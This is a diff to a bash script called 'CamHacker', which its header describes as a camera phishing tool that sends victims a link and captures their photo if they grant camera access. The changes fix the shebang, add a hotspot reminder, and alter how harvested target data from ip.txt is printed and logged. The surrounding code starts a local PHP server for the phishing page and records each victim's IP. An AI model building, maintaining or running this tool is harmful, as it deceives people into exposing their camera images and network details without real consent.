@@ -1,4 +1,4 @@
-#!bin/bash
+#!/bin/bash
 
 # CamHacker
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
@@ -322,6 +322,10 @@ rm -rf ${dir}.zip
 else
 cd $dir
 fi
+if $termux; then
+echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
+sleep 3
+fi
 echo -e "\n${info}Starting php server at localhost:7777....\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
@@ -385,8 +389,9 @@ echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit..
 while true; do
     if [[ -e "ip.txt" ]]; then
         echo -e "\007${success}Target opened the link!\n"
-        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-        echo -e "${info}IP:${green} $ip \n"
+        while IFS= read -r line; do
+            echo -e "${green}[${blue}*${green}]${yellow} $line"
+        done < ip.txt
         cat ip.txt >> $cwd/ips.txt
         rm -rf ip.txt
     fi
